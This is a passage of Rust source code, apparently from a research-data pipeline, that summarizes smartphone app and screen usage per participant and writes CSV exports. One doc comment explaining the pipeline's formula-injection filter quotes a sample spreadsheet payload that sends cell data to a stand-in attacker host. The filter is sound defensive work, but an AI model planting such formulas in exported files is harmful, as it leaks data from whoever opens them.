pub(super) fn build_review_summary(app_rows: &[Row], screen_rows: &[Row]) -> ReviewSummary {
    type ParticipantKey = (SharedString, SharedString);
    type DayKey = (SharedString, SharedString, SharedString);
    // Accumulation order is irrelevant: the emitted participant/day maps are
    // sorted below, and each top-app list has an explicit deterministic sort.
    // Hash maps avoid doing tree comparisons for every one of the tens of
    // thousands of review rows while preserving byte-identical JSON.
    let mut days = AHashMap::<DayKey, ReviewDayAccumulator>::new();
    let mut apps_by_participant = AHashMap::<
        ParticipantKey,
        AHashMap<SharedString, AHashMap<SharedString, ReviewTopAppAccumulator>>,
    >::new();

    for row in app_rows {
        let key = (
            row.study_id.clone(),
            row.participant_id.clone(),
            row.date.clone(),
        );
        // The review day-detail intentionally includes any emitted app row
        // with a measured duration (including explicitly labeled filtered or
        // non-target rows), even though headline usage totals remain limited
        // to App Usage sessions.
        if row.minimum_duration_aggregate_eligible
            && row.maximum_duration_aggregate_eligible
            && row.app_package_name != NO_ACTIVITY_PLACEHOLDER_PACKAGE
        {
            if let Some(minutes) = row.duration_minutes {
                let entry = apps_by_participant
                    .entry((key.0.clone(), key.1.clone()))
                    .or_insert_with(AHashMap::new)
                    .entry(key.2.clone())
                    .or_insert_with(AHashMap::new)
                    .entry(row.app_package_name.clone())
                    .or_insert_with(|| ReviewTopAppAccumulator {
                        application_label: row.application_label.clone(),
                        category: row.broad_app_category.clone(),
                        minutes: 0.0,
                    });
                entry.minutes += minutes;
            }
        }
        if row.app_package_name == NO_ACTIVITY_PLACEHOLDER_PACKAGE {
            // The placeholder marks a raw-data day with no usage: the day is
            // listed, with no session counted on it.
            days.entry(key).or_default();
            continue;
        }
        if !complete_session(row, APP_USAGE) {
            continue;
        }
        let day = days.entry(key).or_default();
        if row.usage_layer.as_deref() == Some("secondary") {
            day.background_ns += review_duration_ns(row);
        } else {
            day.app_ns += review_duration_ns(row);
            day.app_session_count += 1;
        }
    }
    for row in screen_rows {
        if !complete_session(row, SCREEN_USAGE) {
            continue;
        }
        let key = (
            row.study_id.clone(),
            row.participant_id.clone(),
            row.date.clone(),
        );
        let day = days.entry(key).or_default();
        day.screen_ns += review_duration_ns(row);
        day.screen_session_count += 1;
    }

    let mut observed = BTreeMap::<ParticipantKey, BTreeMap<SharedString, ReviewDayMetrics>>::new();
    for ((study_id, participant_id, date), day) in days {
        observed
            .entry((study_id, participant_id))
            .or_default()
            .insert(
                date.clone(),
                ReviewDayMetrics {
                    date,
                    app_usage_minutes: review_minutes(day.app_ns),
                    background_app_usage_minutes: review_minutes(day.background_ns),
                    screen_usage_minutes: review_minutes(day.screen_ns),
                    app_session_count: day.app_session_count,
                    screen_session_count: day.screen_session_count,
                    flags: Vec::new(),
                },
            );
    }

    let mut participants = Vec::new();
    for ((study_id, participant_id), observed_days) in observed {
        let first = observed_days
            .keys()
            .next()
            .map(SharedString::as_str)
            .unwrap_or_default();
        let last = observed_days
            .keys()
            .next_back()
            .map(SharedString::as_str)
            .unwrap_or_default();
        let mut per_day = Vec::new();
        if let (Ok(start), Ok(end)) = (
            NaiveDate::parse_from_str(first, "%Y-%m-%d"),
            NaiveDate::parse_from_str(last, "%Y-%m-%d"),
        ) {
            // A device whose clock was unset at boot stamps one row in 1970,
            // and filling every day from there to the study made tens of
            // thousands of synthetic days and a `total_days` to match. A span
            // no study has is not a spine: past the bound only the observed
            // days are reported.
            let fill_gap_days = (end - start).num_days() <= REVIEW_SUMMARY_MAX_FILLED_SPAN_DAYS;
            if !fill_gap_days {
                per_day.extend(observed_days.values().cloned());
            }
            for day in start
                .iter_days()
                .take_while(|day| fill_gap_days && *day <= end)
            {
                let date = day.format("%Y-%m-%d").to_string();
                per_day.push(observed_days.get(date.as_str()).cloned().unwrap_or(
                    ReviewDayMetrics {
                        date: SharedString::from(date),
                        app_usage_minutes: 0.0,
                        background_app_usage_minutes: 0.0,
                        screen_usage_minutes: 0.0,
                        app_session_count: 0,
                        screen_session_count: 0,
                        flags: vec!["no_usage_day".into()],
                    },
                ));
            }
        }

        let mut totals = ReviewParticipantTotals {
            app_usage_minutes: 0.0,
            background_app_usage_minutes: 0.0,
            screen_usage_minutes: 0.0,
            app_session_count: 0,
            screen_session_count: 0,
            days_with_usage: 0,
            total_days: per_day.len(),
        };
        for day in &per_day {
            totals.app_usage_minutes += day.app_usage_minutes;
            totals.background_app_usage_minutes += day.background_app_usage_minutes;
            totals.screen_usage_minutes += day.screen_usage_minutes;
            totals.app_session_count += day.app_session_count;
            totals.screen_session_count += day.screen_session_count;
            if day.app_session_count + day.screen_session_count > 0
                || day.background_app_usage_minutes > 0.0
            {
                totals.days_with_usage += 1;
            }
        }
        totals.app_usage_minutes = review_round4(totals.app_usage_minutes);
        totals.background_app_usage_minutes = review_round4(totals.background_app_usage_minutes);
        totals.screen_usage_minutes = review_round4(totals.screen_usage_minutes);

        let mut top_apps_by_date = BTreeMap::new();
        for date in observed_days.keys() {
            let Some(by_package) = apps_by_participant
                .get(&(study_id.clone(), participant_id.clone()))
                .and_then(|days| days.get(date))
            else {
                continue;
            };
            let mut top_apps: Vec<_> = by_package
                .iter()
                .map(|(app_package_name, accumulated)| ReviewTopApp {
                    app_package_name: app_package_name.clone(),
                    application_label: accumulated.application_label.clone(),
                    category: accumulated.category.clone(),
                    minutes: review_round4(accumulated.minutes),
                })
                .collect();
            top_apps.sort_by(|left, right| {
                right
                    .minutes
                    .total_cmp(&left.minutes)
                    .then_with(|| left.app_package_name.cmp(&right.app_package_name))
            });
            top_apps.truncate(12);
            if !top_apps.is_empty() {
                top_apps_by_date.insert(date.clone(), top_apps);
            }
        }

        participants.push(ReviewParticipantSummary {
            participant_id,
            study_id,
            totals,
            per_day,
            top_apps_by_date,
        });
    }
    participants.sort_by(|left, right| left.participant_id.cmp(&right.participant_id));
    ReviewSummary {
        participants,
        micro_use_receipt: None,
        foundational_provenance: None,
    }
}

/// Numeric result of ECMAScript `Number.prototype.toFixed`, without building
/// the intermediate decimal string. The binary f64 is decomposed into its
/// exact integer mantissa and power-of-two denominator, then rounded to the
/// requested decimal scale with the specification's larger-integer tie rule.
pub(super) fn ecma_round_fixed_f64(value: f64, frac_digits: u32) -> f64 {
    if !value.is_finite() || value == 0.0 || value.abs() >= 1e21 {
        return value;
    }
    let negative = value.is_sign_negative();
    let bits = value.abs().to_bits();
    let exponent_bits = ((bits >> 52) & 0x7ff) as i32;
    let fraction = bits & ((1_u64 << 52) - 1);
    let (mantissa, exponent) = if exponent_bits == 0 {
        (fraction, 1 - 1023 - 52)
    } else {
        ((1_u64 << 52) | fraction, exponent_bits - 1023 - 52)
    };
    let scale = 10_u128.pow(frac_digits);
    let scaled_mantissa = (mantissa as u128) * scale;
    let rounded_integer = if exponent >= 0 {
        scaled_mantissa
            .checked_shl(exponent as u32)
            .unwrap_or(u128::MAX)
    } else {
        let shift = (-exponent) as u32;
        if shift >= 128 {
            0
        } else {
            let denominator = 1_u128 << shift;
            let quotient = scaled_mantissa / denominator;
            let remainder = scaled_mantissa % denominator;
            quotient + u128::from(remainder >= denominator / 2)
        }
    };
    let rounded = rounded_integer as f64 / scale as f64;
    if negative {
        -rounded
    } else {
        rounded
    }
}

/// ECMAScript Number.prototype.toFixed(fractionDigits) — string form.
/// Spec: pick integer n such that |n/10^f - x| is minimised; on ties pick
/// the larger n. (Round-half-away-from-zero on the exact IEEE 754 value.)
#[cfg(test)]
pub(super) fn ecma_to_fixed(value: f64, frac_digits: u32) -> String {
    if value.is_nan() {
        return "NaN".to_string();
    }
    if value.is_infinite() {
        return if value > 0.0 {
            "Infinity".to_string()
        } else {
            "-Infinity".to_string()
        };
    }
    if value >= 1e21 || value <= -1e21 {
        return js_number_to_string(value);
    }
    let neg = value < 0.0;
    let abs_v = value.abs();
    // Use Rust's round-half-to-even result as a starting point, then bump to
    // round-half-away-from-zero where the original value is exactly halfway.
    // Easier: render with one extra digit, then post-process.
    let extra = format!("{:.*}", (frac_digits + 1) as usize, abs_v);
    // extra looks like "21.625" for frac_digits=2.
    // Truncate the last digit and round if it's >=5; tie at 5 with no further
    // digits is rounded up. But we actually need to check whether the
    // *unrounded* value is exactly the boundary. f64 can't represent 21.625
    // exactly; printing it with f+1 digits in Rust gives the round-half-even
    // result of that. To match JS, render with much higher precision.
    // Simpler approach: render with 17 significant digits, scan + round.
    let high = format!("{:.20}", abs_v);
    let rounded = round_half_away_from_zero_decimal(&high, frac_digits as usize);
    let _ = extra;
    if neg && rounded != "0" && !is_all_zeros(&rounded) {
        format!("-{rounded}")
    } else {
        rounded
    }
}

#[cfg(test)]
pub(super) fn is_all_zeros(s: &str) -> bool {
    s.chars().all(|c| c == '0' || c == '.')
}

/// Round a positive decimal string ("21.62500000000000124...") to `frac_digits`
/// fractional digits, using round-half-away-from-zero on the *exact* string
/// value. The string is expected to have plenty of trailing digits.
#[cfg(test)]
pub(super) fn round_half_away_from_zero_decimal(s: &str, frac_digits: usize) -> String {
    let dot = match s.find('.') {
        Some(i) => i,
        None => {
            // Integer; pad with zeros if frac_digits>0.
            if frac_digits == 0 {
                return s.to_string();
            }
            return format!("{s}.{}", "0".repeat(frac_digits));
        }
    };
    let int_part = &s[..dot];
    let frac_part = &s[dot + 1..];
    if frac_part.len() <= frac_digits {
        // Pad with zeros.
        let pad = "0".repeat(frac_digits - frac_part.len());
        if frac_digits == 0 {
            return int_part.to_string();
        }
        return format!("{int_part}.{frac_part}{pad}");
    }
    // Truncate and inspect.
    let kept = &frac_part[..frac_digits];
    let tail = &frac_part[frac_digits..];
    let first_drop = tail.chars().next().unwrap();
    let round_up = if first_drop > '5' {
        true
    } else if first_drop < '5' {
        false
    } else {
        // first_drop == '5': round-half-away-from-zero always rounds up,
        // whether the remaining digits are zero or non-zero.
        true
    };
    if !round_up {
        if frac_digits == 0 {
            return int_part.to_string();
        }
        return format!("{int_part}.{kept}");
    }
    // Add 1 to the truncated number.
    let combined = if frac_digits == 0 {
        int_part.to_string()
    } else {
        format!("{int_part}{kept}")
    };
    let bumped = increment_decimal_string(&combined);
    if frac_digits == 0 {
        return bumped;
    }
    let split = bumped.len() - frac_digits;
    format!("{}.{}", &bumped[..split], &bumped[split..])
}

pub(super) fn increment_decimal_string(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out: Vec<u8> = bytes.to_vec();
    let mut carry = 1u8;
    for i in (0..out.len()).rev() {
        if !out[i].is_ascii_digit() {
            continue;
        }
        let d = out[i] - b'0' + carry;
        if d >= 10 {
            out[i] = b'0';
            carry = 1;
        } else {
            out[i] = b'0' + d;
            carry = 0;
            break;
        }
    }
    let mut result = String::from_utf8(out).unwrap();
    if carry == 1 {
        result.insert(0, '1');
    }
    result
}

/// JS Number(threshold).toString() — integers print without decimals.
pub(super) fn format_threshold(t: f64) -> String {
    js_number_to_string(t)
}

/// One quoting rule for every kernel CSV: this delegates to the record writer
/// so a bare carriage return is quoted here exactly as it is there. It used to
/// test only `,` `"` `\n`, so a participant id carrying a lone `\r` split the
/// compliance and day-coverage rows in Excel and in Python's `csv` reader.
pub(super) fn csv_escape_value(value: &str) -> String {
    let mut out = Vec::with_capacity(value.len() + 2);
    write_csv_field(&mut out, value.as_bytes());
    String::from_utf8(out).expect("quoting a UTF-8 value only adds ASCII quotes")
}

/// The streaming filter behind `neutralize_spreadsheet_formulas`.
///
/// Excel, LibreOffice and Google Sheets evaluate a CSV cell that begins with
/// `=`, `+`, `-` or `@` as a formula, and a leading TAB or CR is the known way
/// past checks for those four. Application labels, usernames and participant
/// ids come straight from the raw export, so a label such as
/// `=HYPERLINK("https://evil.example/?d="&A1,"click")` used to run when a
/// researcher opened the delivered file. A leading `'` makes every spreadsheet
/// read the cell as text.
///
/// Only text cells change. A cell that is entirely a decimal number (`-5`,
/// `+1.5e3`) is a number to a spreadsheet, never a formula, and keeps its exact
/// bytes, so a negative duration stays a number. `-Infinity`, the spelling the
/// kernel's JS-compatible number formatting gives a negative infinity, is a
/// numeric cell too and is left alone.
///
/// It filters bytes the kernel's own RFC 4180 writers produced
/// (`write_csv_field`), whose shape it relies on: a number never needs quoting,
/// so a quoted cell is always text, and a value containing CR is always
/// quoted, so an unquoted CR can only belong to a record terminator. An
/// unquoted cell that starts with `+` or `-` is held until it either ends or
/// shows a byte no number contains.
pub(crate) struct SpreadsheetFormulaNeutralizer<W: std::io::Write> {
    inner: W,
    state: NeutralizerState,
    /// The held cell while in `SignedPending`.
    pending: Vec<u8>,
    /// Whether every held byte is one a decimal number can contain, kept per
    /// byte so a long held cell costs linear time.
    pending_numeric_bytes: bool,
    out: Vec<u8>,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum NeutralizerState {
    CellStart,
    Unquoted,
    /// An unquoted cell that began with `+` or `-`; its bytes are in `pending`.
    SignedPending,
    QuotedStart,
    Quoted,
    /// A `"` inside a quoted cell: the close, or the first half of `""`.
    QuotedQuote,
}

const FORMULA_NEUTRALIZER: u8 = b'\'';

fn starts_a_formula(byte: u8) -> bool {
    matches!(byte, b'=' | b'+' | b'-' | b'@' | b'\t' | b'\r')
}

fn ends_an_unquoted_cell(byte: u8) -> bool {
    matches!(byte, b',' | b'\n' | b'\r')
}

/// `[+-]? (digits [. digits?] | . digits) ([eE] [+-]? digits)?`, the whole cell.
fn is_decimal_number(cell: &[u8]) -> bool {
    let mut index = 0;
    if matches!(cell.first(), Some(b'+' | b'-')) {
        index += 1;
    }
    let integer_start = index;
    while cell.get(index).is_some_and(u8::is_ascii_digit) {
        index += 1;
    }
    let mut digits = index - integer_start;
    if cell.get(index) == Some(&b'.') {
        index += 1;
        let fraction_start = index;
        while cell.get(index).is_some_and(u8::is_ascii_digit) {
            index += 1;
        }
        digits += index - fraction_start;
    }
    if digits == 0 {
        return false;
    }
    if matches!(cell.get(index), Some(b'e' | b'E')) {
        index += 1;
        if matches!(cell.get(index), Some(b'+' | b'-')) {
            index += 1;
        }
        let exponent_start = index;
        while cell.get(index).is_some_and(u8::is_ascii_digit) {
            index += 1;
        }
        if index == exponent_start {
            return false;
        }
    }
    index == cell.len()
}

fn can_continue_a_number(byte: u8) -> bool {
    byte.is_ascii_digit() || matches!(byte, b'.' | b'e' | b'E' | b'+' | b'-')
}

const SIGNED_INFINITY_TAIL: &[u8] = b"Infinity";

/// A signed cell that is a number to a spreadsheet: a decimal, or the
/// `-Infinity` / `+Infinity` spelling of JS number formatting.
fn is_numeric_cell(cell: &[u8]) -> bool {
    is_decimal_number(cell) || cell.get(1..) == Some(SIGNED_INFINITY_TAIL)
}

impl<W: std::io::Write> SpreadsheetFormulaNeutralizer<W> {
    pub(crate) fn new(inner: W) -> Self {
        Self {
            inner,
            state: NeutralizerState::CellStart,
            pending: Vec::new(),
            pending_numeric_bytes: true,
            out: Vec::new(),
        }
    }

    fn release_pending(&mut self) {
        if !is_numeric_cell(&self.pending) {
            self.out.push(FORMULA_NEUTRALIZER);
        }
        self.out.append(&mut self.pending);
    }

    /// Whether the held cell plus `byte` can still end as a numeric cell.
    fn may_stay_numeric(&mut self, byte: u8) -> bool {
        self.pending_numeric_bytes &= can_continue_a_number(byte);
        // `pending[0]` is the sign; what follows may be a prefix of `Infinity`.
        let held_tail = &self.pending[1..];
        let infinity_prefix = held_tail.len() < SIGNED_INFINITY_TAIL.len()
            && SIGNED_INFINITY_TAIL.starts_with(held_tail)
            && SIGNED_INFINITY_TAIL[held_tail.len()] == byte;
        self.pending_numeric_bytes || infinity_prefix
    }

    fn push(&mut self, byte: u8) {
        use NeutralizerState::*;
        self.state = match self.state {
            CellStart => match byte {
                b'"' => {
                    self.out.push(byte);
                    QuotedStart
                }
                b'+' | b'-' => {
                    self.pending.push(byte);
                    self.pending_numeric_bytes = true;
                    SignedPending
                }
                // An unquoted CR is the first half of a CRLF terminator.
                _ if ends_an_unquoted_cell(byte) => {
                    self.out.push(byte);
                    CellStart
                }
                _ if starts_a_formula(byte) => {
                    self.out.extend_from_slice(&[FORMULA_NEUTRALIZER, byte]);
                    Unquoted
                }
                _ => {
                    self.out.push(byte);
                    Unquoted
                }
            },
            Unquoted => {
                self.out.push(byte);
                if ends_an_unquoted_cell(byte) { CellStart } else { Unquoted }
            }
            SignedPending => {
                if ends_an_unquoted_cell(byte) {
                    self.release_pending();
                    self.out.push(byte);
                    CellStart
                } else if self.may_stay_numeric(byte) {
                    self.pending.push(byte);
                    SignedPending
                } else {
                    self.out.push(FORMULA_NEUTRALIZER);
                    self.out.append(&mut self.pending);
                    self.out.push(byte);
                    Unquoted
                }
            }
            QuotedStart => match byte {
                b'"' => {
                    self.out.push(byte);
                    QuotedQuote
                }
                _ if starts_a_formula(byte) => {
                    self.out.extend_from_slice(&[FORMULA_NEUTRALIZER, byte]);
                    Quoted
                }
                _ => {
                    self.out.push(byte);
                    Quoted
                }
            },
            Quoted => {
                self.out.push(byte);
                if byte == b'"' { QuotedQuote } else { Quoted }
            }
            QuotedQuote => {
                self.out.push(byte);
                match byte {
                    b'"' => Quoted,
                    _ if ends_an_unquoted_cell(byte) => CellStart,
                    _ => Unquoted,
                }
            }
        };
    }

    /// Releases a held final cell (a record without a trailing newline) and
    /// returns the inner writer.
    pub(crate) fn finish(mut self) -> std::io::Result<W> {
        if self.state == NeutralizerState::SignedPending {
            self.release_pending();
        }
        self.inner.write_all(&self.out)?;
        self.inner.flush()?;
        Ok(self.inner)
    }
}

impl<W: std::io::Write> std::io::Write for SpreadsheetFormulaNeutralizer<W> {
    fn write(&mut self, bytes: &[u8]) -> std::io::Result<usize> {
        self.out.clear();
        self.out.reserve(bytes.len() + bytes.len() / 64 + 1);
        for &byte in bytes {
            self.push(byte);
        }
        self.inner.write_all(&self.out)?;
        self.out.clear();
        Ok(bytes.len())
    }

    fn flush(&mut self) -> std::io::Result<()> {
        self.inner.flush()
    }
}

/// `neutralize_spreadsheet_formulas` over one complete CSV.
pub(crate) fn neutralize_spreadsheet_formulas(csv: &[u8]) -> Vec<u8> {
    let mut filter = SpreadsheetFormulaNeutralizer::new(Vec::with_capacity(csv.len()));
    filter.write_all(csv).expect("writing to a Vec cannot fail");
    filter.finish().expect("writing to a Vec cannot fail")
}

pub(super) fn js_rounded_number(value: f64) -> String {
    let mut text = normalize_float_string(value);
    if let Some(integer) = text.strip_suffix(".0") {
        text = integer.to_string();
    }
    text
}

// ---- output writer ------------------------------------------------------

pub fn declared_app_output_columns(
    include_codebook: bool,
    include_codebook_aliases: bool,
    usage_layer_active: bool,
    custom_app_engagement_duration: f64,
    include_app_usage_end_reason: bool,
    include_usage_session_id: bool,
) -> Vec<String> {
    let mut cols: Vec<String> = Vec::with_capacity(64);
    cols.push("study_id".into());
    cols.push("study_name".into());
    cols.push("participant_id".into());
    cols.push("possible_device_model".into());
    cols.push("username".into());
    cols.push("event_timestamp".into());
    cols.push("date".into());
    cols.push("timezone".into());
    cols.push("app_package_name".into());
    cols.push("application_label".into());
    if include_codebook {
        cols.push("genreId_scraped".into());
    }
    if include_codebook && include_codebook_aliases {
        cols.push("broad_app_category".into());
    }
    if include_codebook {
        for c in codebook_output_columns() {
            cols.push(c.to_string());
        }
    }
    cols.push("interaction_type".into());
    cols.push("start_timestamp".into());
    cols.push("stop_timestamp".into());
    if include_app_usage_end_reason {
        cols.push("app_usage_end_reason".into());
    }
    // Sits beside the end reason rather than at the end of the row: both
    // answer "how was this interval decided", and a reader comparing two
    // policies wants them adjacent.
    if include_usage_session_id {
        cols.push("usage_session_id".into());
    }
    cols.push("duration_seconds".into());
    cols.push("duration_minutes".into());
    cols.push("any_app_usage_flags".into());
    cols.push("data_time_gap_hours".into());
    cols.push("day".into());
    cols.push("weekdayMF".into());
    cols.push("weekdayMTh".into());
    cols.push("weekdaySuTh".into());
    cols.push("hour".into());
    cols.push("quarter".into());
    cols.push("valid_app_new_engage_30s".into());
    cols.push(format!(
        "valid_app_new_engage_custom_{}s",
        format_custom_dur(custom_app_engagement_duration)
    ));
    cols.push("valid_app_switched_app".into());
    cols.push("valid_app_usage_time_gap_hours".into());
    cols.push("any_app_new_engage_30s".into());
    cols.push(format!(
        "any_app_new_engage_custom_{}s",
        format_custom_dur(custom_app_engagement_duration)
    ));
    cols.push("any_app_switched_app".into());
    cols.push("any_app_usage_time_gap_hours".into());
    cols.push("preprocessor_version".into());
    cols.push("datetime_of_preprocessing".into());
    if usage_layer_active {
        cols.push("usage_layer".into());
    }
    cols
}

pub(super) fn build_app_columns(opts: &PipelineV2Options, include_codebook_aliases: bool) -> Vec<String> {
    let mut columns = declared_app_output_columns(
        opts.use_app_codebook,
        include_codebook_aliases,
        opts.model_concurrent_usage || opts.use_background_apps_file,
        opts.custom_app_engagement_duration,
        opts.include_app_usage_end_reason,
        opts.session_grouping_policy != SessionGroupingPolicy::None,
    );
    insert_conditional_app_output_columns(
        &mut columns,
        schoedel_is_active(opts),
        opts.micro_use_classification_policy != MicroUseClassificationPolicy::None,
        opts.minimum_duration_comparator != MinimumDurationComparator::StrictLt
            || opts.minimum_duration_disposition != MinimumDurationDisposition::ChronicleBlankKeepRow,
        maximum_duration_row_stage(opts).generic_stage_active(),
    );
    columns
}

/// The app columns a research-axis selection adds to the declared header.
/// Shared by `build_app_columns` and the output-column contract exporter, so
/// the researcher codebook enumerates exactly what a run can emit.
pub fn insert_conditional_app_output_columns(
    columns: &mut Vec<String>,
    schoedel_active: bool,
    micro_use_active: bool,
    b04_columns: bool,
    b06_generic_active: bool,
) {
    if schoedel_active {
        let insert_at = columns
            .iter()
            .position(|column| column == "stop_timestamp")
            .map_or(columns.len(), |index| index + 1);
        columns.splice(
            insert_at..insert_at,
            ["screen_interval_id".into(), "schoedel_completion".into()],
        );
    }
    let insert_at = columns
        .iter()
        .position(|column| column == "duration_minutes")
        .map_or(columns.len(), |index| index + 1);
    let mut foundational = Vec::new();
    if micro_use_active {
        foundational.push("micro_use_classification".into());
    }
    if b04_columns {
        foundational.extend([
            "raw_episode_duration_seconds".into(),
            "minimum_duration_qualified".into(),
            "minimum_duration_aggregate_eligible".into(),
        ]);
    }
    // B06 columns appear only when the generic post-reconstruction stage
    // runs; the omitted, strategy-native and Chronicle-arm shapes publish the
    // pre-B06 header byte-for-byte.
    if b06_generic_active {
        if !b04_columns {
            foundational.push("raw_episode_duration_seconds".into());
        }
        foundational.extend([
            "maximum_duration_qualified".into(),
            "maximum_duration_aggregate_eligible".into(),
            "maximum_duration_trimmed_seconds".into(),
            "effective_endpoint_reason".into(),
        ]);
    }
    columns.splice(insert_at..insert_at, foundational);
}

pub(super) fn format_custom_dur(d: f64) -> String {
    js_number_to_string(d)
}

pub fn declared_screen_output_columns() -> Vec<String> {
    vec![
        "study_id",
        "study_name",
        "participant_id",
        "possible_device_model",
        "username",
        "event_timestamp",
        "date",
        "timezone",
        "app_package_name",
        "application_label",
        "interaction_type",
        "start_timestamp",
        "stop_timestamp",
        "duration_seconds",
        "duration_minutes",
        "screen_usage_end_reason",
        "screen_usage_end_reason_confidence",
        "screen_usage_stop_event_type",
        "screen_usage_last_activity_timestamp",
        "screen_usage_tail_gap_seconds",
        "screen_usage_foreground_app_package",
        "screen_usage_apps_forcing_screen_open_label",
        "screen_usage_lock_screen_only",
        "data_time_gap_hours",
        "day",
        "weekdayMF",
        "weekdayMTh",
        "weekdaySuTh",
        "hour",
        "quarter",
        "preprocessor_version",
        "datetime_of_preprocessing",
    ]
    .into_iter()
    .map(String::from)
    .collect()
}

pub fn declared_screen_output_columns_for_strategy(
    strategy: ScreenSessionConstructionStrategyId,
) -> Vec<String> {
    let mut columns = declared_screen_output_columns();
    if strategy != ScreenSessionConstructionStrategyId::ChronicleScreenInteractiveV1 {
        columns.extend([
            "screen_interval_id".into(),
            "screen_session_construction_strategy".into(),
            "screen_interval_kind".into(),
            "screen_start_boundary_source_row".into(),
            "screen_stop_boundary_source_row".into(),
            "screen_start_source_rows".into(),
            "screen_stop_source_rows".into(),
            "screen_interval_close_reason".into(),
            "screen_interval_left_censored".into(),
            "screen_interval_right_censored".into(),
        ]);
    }
    columns
}

pub(super) fn build_screen_columns() -> Vec<String> {
    declared_screen_output_columns()
}

pub(super) fn append_csv_field(out: &mut Vec<u8>, value: &str) {
    write_csv_field(out, value.as_bytes());
}

pub(super) const SMALL_U8_DECIMALS: [&str; 24] = [
    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16",
    "17", "18", "19", "20", "21", "22", "23",
];

pub(super) fn begin_csv_field(out: &mut Vec<u8>, first: &mut bool) {
    if !*first {
        out.push(b',');
    }
    *first = false;
}

pub(super) fn emit_csv_u8(out: &mut Vec<u8>, value: u8, first: &mut bool) {
    begin_csv_field(out, first);
    if let Some(value) = SMALL_U8_DECIMALS.get(value as usize) {
        out.extend_from_slice(value.as_bytes());
    } else {
        append_csv_field(out, &value.to_string());
    }
}

pub(super) fn emit_csv_i32(out: &mut Vec<u8>, value: i32, first: &mut bool) {
    begin_csv_field(out, first);
    match value {
        0 => out.push(b'0'),
        1 => out.push(b'1'),
        _ => append_csv_field(out, &value.to_string()),
    }
}

/// An absent session id writes an empty cell rather than a sentinel: 0 is a
/// real session number under every policy here, so any numeric stand-in would
/// be indistinguishable from a participant's first session.
pub(super) fn emit_csv_optional_i64(out: &mut Vec<u8>, value: Option<i64>, first: &mut bool) {
    begin_csv_field(out, first);
    if let Some(value) = value {
        append_csv_field(out, &value.to_string());
    }
}

pub(super) fn emit_csv_optional_float(out: &mut Vec<u8>, value: Option<f64>, first: &mut bool) {
    begin_csv_field(out, first);
    match value {
        None => {}
        Some(0.0) => out.extend_from_slice(b"0.0"),
        Some(value) => append_csv_field(out, &normalize_float_string(value)),
    }
}

pub(super) fn emit_csv_float(out: &mut Vec<u8>, value: f64, first: &mut bool) {
    begin_csv_field(out, first);
    if value == 0.0 {
        out.extend_from_slice(b"0.0");
    } else {
        append_csv_field(out, &normalize_float_string(value));
    }
}

pub(super) fn write_app_csv(rows: &[Row], opts: &PipelineV2Options, include_aliases: bool) -> Vec<u8> {
    write_app_csv_from_iter(rows.iter(), opts, include_aliases)
}

/// Counts what a writer would emit, so a buffer is sized to its content
/// instead of an estimate's slack or a doubling copy.
pub(super) struct CountingSink(pub(super) usize);

impl std::io::Write for CountingSink {
    fn write(&mut self, bytes: &[u8]) -> std::io::Result<usize> {
        self.0 += bytes.len();
        Ok(bytes.len())
    }
    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

pub(super) fn write_app_csv_from_iter<'a>(
    rows: impl Iterator<Item = &'a Row> + Clone,
    opts: &PipelineV2Options,
    include_aliases: bool,
) -> Vec<u8> {
    // Formatted twice, the first time into a counter: a 470,000-row export
    // is 147 MB of CSV, and the per-row estimate this replaced reserved 231
    // MB for it at the pass's high-water mark.
    let mut count = CountingSink(0);
    write_app_csv_to(rows.clone(), opts, include_aliases, &mut count).expect("counting writer");
    let mut bytes = Vec::with_capacity(count.0);
    write_app_csv_to(rows, opts, include_aliases, &mut bytes).expect("Vec writer");
    debug_assert_eq!(bytes.len(), count.0, "the counting pass and the write disagree");
    bytes
}

pub(super) fn write_app_csv_to<'a>(
    rows: impl Iterator<Item = &'a Row>,
    opts: &PipelineV2Options,
    include_aliases: bool,
    sink: &mut impl std::io::Write,
) -> Result<(), String> {
    let cols = build_app_columns(opts, include_aliases);
    let mut out = Vec::with_capacity(1024);
    // header
    for (i, c) in cols.iter().enumerate() {
        if i > 0 {
            out.push(b',');
        }
        append_csv_field(&mut out, c);
    }
    out.push(b'\n');
    sink.write_all(&out).map_err(|error| error.to_string())?;
    out.clear();
    let tz: Tz = opts.timezone.parse().unwrap_or(Tz::UTC);
    let pp_version = PREPROCESSOR_VERSION;
    let dop = &opts.datetime_of_preprocessing;
    let b04_columns = opts.minimum_duration_comparator != MinimumDurationComparator::StrictLt
        || opts.minimum_duration_disposition != MinimumDurationDisposition::ChronicleBlankKeepRow;
    let maximum_duration_columns = maximum_duration_row_stage(opts).generic_stage_active();
    for row in rows {
        let row_tz = if row.timezone.as_str() == opts.timezone {
            tz
        } else {
            row.timezone.parse().unwrap_or(tz)
        };
        let mut first = true;
        let emit = |out: &mut Vec<u8>, s: &str, first: &mut bool| {
            if !*first {
                out.push(b',');
            }
            *first = false;
            append_csv_field(out, s);
        };
        emit(&mut out, &row.study_id, &mut first);
        emit(&mut out, &opts.study_name, &mut first);
        emit(&mut out, &row.participant_id, &mut first);
        emit(&mut out, &row.possible_device_model, &mut first);
        emit(&mut out, &row.username, &mut first);
        emit_event_timestamp(&mut out, row.event_timestamp_ns, row_tz, &mut first);
        emit(&mut out, &row.date, &mut first);
        emit(&mut out, &row.timezone, &mut first);
        emit(&mut out, &row.app_package_name, &mut first);
        emit(&mut out, &row.application_label, &mut first);
        if opts.use_app_codebook {
            emit(
                &mut out,
                row.genre_id_scraped.as_deref().unwrap_or(""),
                &mut first,
            );
        }
        if opts.use_app_codebook && include_aliases {
            emit(
                &mut out,
                row.broad_app_category.as_deref().unwrap_or(""),
                &mut first,
            );
        }
        if opts.use_app_codebook {
            for (i, _) in CODEBOOK_RENAME_PAIRS.iter().enumerate() {
                let val = if row.codebook_genre_fields_cleared
                    && COLLAPSED_GENRE_FIELD_INDICES.contains(&i)
                {
                    ""
                } else {
                    row.codebook_fields
                        .get(i)
                        .and_then(|v| v.as_deref())
                        .unwrap_or("")
                };
                let normalized = if val == "True" {
                    "true"
                } else if val == "False" {
                    "false"
                } else {
                    val
                };
                emit(&mut out, normalized, &mut first);
            }
        }
        emit(&mut out, &row.interaction_type, &mut first);
        emit_session_timestamp(&mut out, row.start_timestamp_ns, row_tz, &mut first);
        emit_session_timestamp(&mut out, row.stop_timestamp_ns, row_tz, &mut first);
        if schoedel_is_active(opts) {
            emit(
                &mut out,
